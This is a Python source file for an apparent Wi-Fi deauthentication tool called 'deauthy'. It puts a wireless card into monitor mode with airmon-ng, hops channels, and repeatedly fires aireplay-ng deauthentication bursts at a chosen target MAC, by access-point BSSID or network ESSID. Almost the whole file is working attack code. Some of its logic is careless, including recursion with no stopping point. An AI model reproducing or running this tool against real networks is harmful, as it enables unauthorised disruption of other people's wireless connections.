from socket import if_nameindex
from deauthy.deauthy_types import Interface, BSSID, ESSID, MAC
from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
import sys
import json
import threading
import time

class Functs:
    def prompt_for_ifaces():
        from deauthy.terminal import Terminal
        white       = Terminal.White
        yellow      = Terminal.Yellow
        bold        = Terminal.Bold
        light_white = Terminal.Light_white
        end         = Terminal.End
        light_blue  = Terminal.Light_blue
        light_green = Terminal.Light_green
        red         = Terminal.Red
        cards = []
        interfaces = {} # type: dict[str, str]
        def gather_ifaces():
            pos = 1
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}")
                cards.append(str(pos))
                interfaces[str(pos)] = ifaces[1]
                pos += 1
            return pos-1
        ifaces = gather_ifaces()
        try:
            method = Terminal.prompt(question=f"{light_white}select a network interface. Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", allowed_replies=cards, ending_color=yellow)
            selected_card = interfaces[method]
            return selected_card
        except KeyboardInterrupt:
            print(" ")
            Terminal.inform(msg=f"{light_green}{bold}Goodbye!\n{end}Exiting...")
            exit(0)
        except KeyError:
            print(" ")
            Terminal.inform(msg=f"{red}{bold}Hey! {end}{red}That's not a valid interface! >:(\n{red}{bold}AGAIN!")
            Functs.prompt_for_ifaces()

    def is_in_monitor_mode(card: Interface):
        if card.name.endswith(f"mon"):
            return True
        return False

    def switch(card: Interface, mode: str):
        """
        Accepts either "monitor" or "managed"
        """
        from deauthy.terminal import Terminal
        from deauthy.functs import mod_config
        from halo import Halo
        end = Terminal.End
        def managed():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                out = check_call(["airmon-ng", "stop", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                if out != 1:
                    spinner.succeed(f"{card.name} is now in {mode} mode")
                     
                else:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")
        def monitor():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                out = check_call(["airmon-ng", "start", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                if out != 1:
                    spinner.succeed(f"{card.name} is now in {mode} mode")
                else:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")
            
            
        modes = {
            "managed":managed,
            "monitor":monitor,
        }
        try:
            modes[mode]()
        except KeyError:
            raise RuntimeError("That's not a valid interface mode.")

    def do_bssid_method(bssid: BSSID):
        from deauthy.functs import get_var
        Functs.BSSID_METHOD.deauth(bssid)
        try:
            Functs.do_bssid_method(bssid)
        except KeyboardInterrupt:
            Functs.switch(card=Interface(get_var('interface')), mode="managed")
            return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class BSSID_METHOD:
        def deauth(bssid: BSSID):
            """"""

            for key, value in bssid.bssids.items():
                Functs.ChannelSys.hopper(value)
                try:
                    out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
                    Functs.BSSID_METHOD.deauth(BSSID(bssid.bssids))
                except KeyboardInterrupt:
                    Functs.switch(Interface(get_var('interface')), "managed")
                    return

    class ESSID_METHOD:
        def deauth(eSSID: ESSID):
            """"""
            from deauthy.functs import get_var
            current_wiface  = get_var('interface')
            target_mac      = get_var('target_mac')
            channel = eSSID.channel
            Functs.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
                Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
            except KeyboardInterrupt:
                Functs.switch(Interface(current_wiface), "managed")
                return

def mod_config(key: str, value):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        
    data[key] = value
    with open("deauthy/conf.json", "w") as jsonfile:
        myJSON = json.dump(data, jsonfile, indent=2)
        jsonfile.close()

def get_var(key: str):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        try:
            val = data[key]
            return val
        except KeyError:
            return None
